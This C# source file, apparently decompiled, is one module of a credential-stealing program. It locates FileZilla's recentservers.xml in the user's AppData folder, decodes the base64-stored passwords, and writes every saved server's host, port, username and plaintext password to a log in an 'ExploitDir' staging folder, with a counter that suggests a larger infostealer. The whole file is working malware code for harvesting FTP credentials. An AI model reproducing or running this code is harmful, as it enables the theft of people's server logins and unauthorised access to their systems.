using System;
using System.IO;
using System.Text;
using System.Xml;

namespace exos;

internal class FileZilla
{
	private static StringBuilder SB = new StringBuilder();

	public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");

	public static void GetFileZilla()
	{
		string exploitDir = Helper.ExploitDir;
		if (File.Exists(FzPath))
		{
			Directory.CreateDirectory(exploitDir + "\\FileZilla");
			GetDataFileZilla(FzPath, exploitDir + "\\FileZilla\\FileZilla.log");
		}
	}

	public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
	{
		try
		{
			if (!File.Exists(PathFZ))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(PathFZ);
			foreach (XmlElement item in ((XmlElement)xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
			{
				string innerText = item.GetElementsByTagName("Host")[0].InnerText;
				string innerText2 = item.GetElementsByTagName("Port")[0].InnerText;
				string innerText3 = item.GetElementsByTagName("User")[0].InnerText;
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(item.GetElementsByTagName("Pass")[0].InnerText));
				if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3) && !string.IsNullOrEmpty(@string))
				{
					SB.AppendLine("Host: " + innerText);
					SB.AppendLine("Port: " + innerText2);
					SB.AppendLine("User: " + innerText3);
					SB.AppendLine("Pass: " + @string + "\r\n");
					Counting.FileZilla++;
					continue;
				}
				break;
			}
			if (SB.Length > 0)
			{
				File.AppendAllText(SaveFile, SB.ToString());
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
